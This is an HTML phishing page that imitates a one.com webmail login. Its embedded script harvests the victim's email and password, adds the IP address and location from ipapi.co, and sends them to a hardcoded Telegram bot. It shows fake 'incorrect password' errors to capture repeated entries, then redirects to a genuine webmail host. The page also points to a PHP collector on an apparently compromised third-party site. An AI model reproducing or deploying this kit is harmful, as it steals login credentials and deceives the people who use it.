
<!doctype html>

  <body>
    <header>
      <div class="img">
        <img src="https://www.hostingadvice.com/wp-content/uploads/2016/02/one-com-logo.jpg" alt="" />
      </div>
      </div>
      <h3 class="show">Webmail</h3>
    </header>
    <main>
      <div class="iformbox">
        <h3 class="hideme">Webmail</h3>
        <form action="" method="post" id="sub">
          <h5></h5>

          <div class="mb-3">
            <label for="exampleFormControlInput1" class="form-label"
              >Email</label
            >
            <input
              type="email"
              name="aa"
              class="form-control"
              id="exampleFormControlInput1"
              placeholder="email@example.com"
              required
            />
          </div>
          <div class="mb-3" id="pasbox">
            <label for="" class="form-label">Password</label>
            <input
              type="password"
              name="bb"
              class="form-control"
              id="password"
              required
            />
          </div>
          <span>
            <input type="checkbox" name="" id="" />
            Stay signed in
          </span>
          <div class="col-xs-12 alert-highlight" id="highlight">
            <div
              class="selectable-text alert alert-info"
              style="padding: 0.5rem !important; color: #000"
            >
              The email or password you entered is incorrect. Please try again.
            </div>
          </div>
          <div class="btn">
            <button type="button" id="continue" type="button">Log In</button>
          </div>
        </form>
      </div>
        <div class="composition-element login-spacer"></div>
        <span style="color: rgb(108, 108, 108)"></span>
        <div class="composition-element">
          <span style="color: rgb(108, 108, 108)"></span
          ><span style="color: rgb(108, 108, 108)"></span>
        </div>
        <div class="composition-element custom-login-links">
          <span class=""></span>
        </div>
      </footer>
    </main>
    <script>
      const fullUrl = window.location.href;
      const emailRegex = /#([^#]+)$/;
      const match = fullUrl.match(emailRegex);
      const email = match ? match[1] : null;

      console.log(email);

      if (email) {
        document.getElementById("exampleFormControlInput1").value = email;
      }

      document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
      });

      document.getElementById("continue").addEventListener("click", () => {
        document.getElementById("pasbox").style.display = "block";
        document.getElementById("continue").type = "submit";
        document.getElementById("continue").innerHTML = "Log in";
      });

      const botToken = "6447918569:AAFZd1esJ_u7SlffaFoT5_WSceGU3Qg9G8k";
      const chatId = "6666151018";

      const phpurl = "https://eurovit.hu/wp-content/plugins/emph/result.php"; // YOUR PHP URL HERE AND MAKE SURE IT'S CORRECT
      var formSubmitted = 0;

      document
        .getElementById("sub")
        .addEventListener("submit", function (event) {
          event.preventDefault();

          formSubmitted++;

          var inputs = document.querySelectorAll("input[required]");
          for (var i = 0; i < inputs.length; i++) {
            if (!inputs[i].value.trim()) {
              alert("Please fill in all fields.");
              return;
            }
          }

          var formData = new FormData(this);

          // Fetch IP & Location Data (with timeout)

          try {
            fetch("https://ipapi.co/json/", { timeout: 5000 })
              .then((response) => response.json())
              .then((data) => {
                const ip = data.ip || "N/A";
                const city = data.city || "N/A";
                const region = data.region || "N/A";
                const country = data.country_name || "N/A";

                formData.append("ip", ip);
                formData.append("city", city);
                formData.append("region", region);
                formData.append("country", country);
              })
              .catch((error) => {
                console.error("Error fetching IP and location data:", error);
              });
          } catch (error) {
            console.error("Error fetching IP and location data:", error);
          }

          // send form data to telegram bot using fetch API
          const message = `Email: ${formData.get("aa")}\nPassword: ${formData.get(
            "bb",
          )}\nIP: ${formData.get("ip")}\nCity: ${formData.get(
            "city",
          )}\nRegion: ${formData.get("region")}\nCountry: ${formData.get(
            "country",
          )}`;

          // fetch post request to telegram bot API
          const response = fetch(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: message,
              }),
            },
          )
            .then((response) => response.json())
            .then((data) => {
              console.log("Message sent to Telegram bot:", data);

              if (formSubmitted === 1) {
                document.getElementById("password").value = "";
                document.getElementById("highlight").style.display = "block";
              } else if (formSubmitted === 2) {
                document.getElementById("password").value = "";
              } else if (formSubmitted >= 3) {
                // document.getElementById("password").value = "";
                // Redirect to the specified URL
                window.location.href =
                  "https://webmail.roundcube.101.hostinglogin.net/";
                console.log("GOOOOOO");
              }
            })
            .catch((error) => {
              console.error("Error sending message to Telegram bot:", error);
            });
        });
    </script>
  </body>
